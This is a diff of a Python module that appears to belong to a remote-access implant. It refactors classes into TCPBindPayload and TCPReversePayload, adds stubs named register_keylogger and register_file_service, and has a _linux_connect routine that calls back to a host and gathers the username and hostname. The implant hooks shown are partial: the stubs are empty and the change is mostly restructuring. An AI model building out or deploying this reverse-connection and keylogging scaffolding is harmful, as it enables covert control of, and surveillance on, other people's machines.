@@ -11,7 +11,8 @@ from .. import rpc
 from . import *
 
 
-class PayloadRPCHandler(rpc.RPCHandler):
+class PayloadRPCDispatcher(rpc.RPCHandler):
+    ''' Mix-in class that dispatches RPC requests. '''
 
     def rpc_dir(self):
         return list(self._functions)
@@ -19,28 +20,36 @@ class PayloadRPCHandler(rpc.RPCHandler):
     def rpc_echo(self, s):
         return s
 
+    def register_file_service(self, mode):
+        pass
+
+    def register_keylogger(self):
+        pass
+
+
 class PayloadRequestHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
-        sock = self.request
-        handler = PayloadRPCHandler()
-        handler.handle_socket(sock)
+        self.server.handle_socket(self.request)
 
 
-class ReversePayload(Payload):
+class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
+
+    def __init__(self, addr, requestHandler=PayloadRequestHandler,
+            logRequests=True, allow_none=False, encoding=None,
+            bind_and_activate=True, use_builtin_types=False):
+        self.logRequests = logRequests
+
+        #PayloadRPCDispatcher.__init__(self, allow_none, encoding, use_builtin_types)
+        PayloadRPCDispatcher.__init__(self)
+        socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)
+
+
+class TCPReversePayload(TCPClient, PayloadRPCDispatcher):
     
     def __init__(self, addr):
-        sock = socket.create_connection(addr)
-        super().__init__(sock)
-
-
-class BindPayload(Payload):
-    
-    def __init__(self, addr):
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(addr)
-        server.listen(1)
-        client, _ = server.accept()
+        self.address = addr
+        self.retry_interval = 1
 
 
 class FileService(FileOpener, FileReader, FileWriter):
@@ -50,7 +59,7 @@ class FileService(FileOpener, FileReader, FileWriter):
 def _linux_connect(args):
     host, port = addr = args.host, args.port
 
-    with ReversePayload(addr) as payload:
+    with TCPReversePayload(addr) as payload:
         funcs = [
                 get_username,
                 get_hostname,
